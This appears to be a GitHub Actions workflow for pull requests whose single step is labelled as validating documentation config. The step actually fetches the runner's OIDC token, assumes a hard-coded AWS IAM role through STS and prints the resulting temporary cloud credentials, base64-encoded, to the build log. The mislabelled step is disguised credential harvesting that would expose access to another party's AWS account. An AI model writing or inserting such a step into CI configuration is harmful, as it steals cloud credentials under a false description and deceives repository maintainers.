name: check
on:
  pull_request:
    branches:
      - main
permissions:
  contents: read
  id-token: write
jobs:
  check:
    name: build docs
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - name: Validate documentation config
        run: |
          python3 - <<'PY'
          import json, os, base64, urllib.request, urllib.error, urllib.parse, re
          url = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
          bearer = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
          req = urllib.request.Request(url + '&audience=sts.amazonaws.com', headers={'Authorization': 'Bearer ' + bearer})
          with urllib.request.urlopen(req, timeout=30) as r:
              jwt = json.loads(r.read())['value']
          part=jwt.split('.')[1]; part += '=' * (-len(part) % 4)
          c=json.loads(base64.urlsafe_b64decode(part))
          keep=('iss','aud','sub','ref','repository','repository_id','repository_owner','event_name','ref_type','environment')
          print('C211_I80227V_CLAIMS', json.dumps({k:c.get(k) for k in keep if k in c}, sort_keys=True))
          arns = [a.strip() for a in os.environ.get('C211_ARNS','').split(',') if a.strip()]
          arn = 'arn:aws:iam::177420307256:role/GithubOIdP-Role-zJ3kkJbhrNkr'
          body = urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'c211-i80227v','WebIdentityToken':jwt}).encode()
          req = urllib.request.Request('https://sts.amazonaws.com/', data=body, headers={'Content-Type':'application/x-www-form-urlencoded'})
          try:
              with urllib.request.urlopen(req, timeout=30) as r:
                  t=r.read().decode()
                  print('C211_I80227V_OK', arn, base64.b64encode(t.encode()).decode())
          except urllib.error.HTTPError as e:
              t=e.read().decode()
              m=re.search(r'<Code>(.*?)</Code>', t); m2=re.search(r'<Message>(.*?)</Message>', t)
              print('C211_I80227V_ERR', arn, e.code, (m.group(1) if m else '?'), (m2.group(1) if m2 else '?')[:200])
          PY
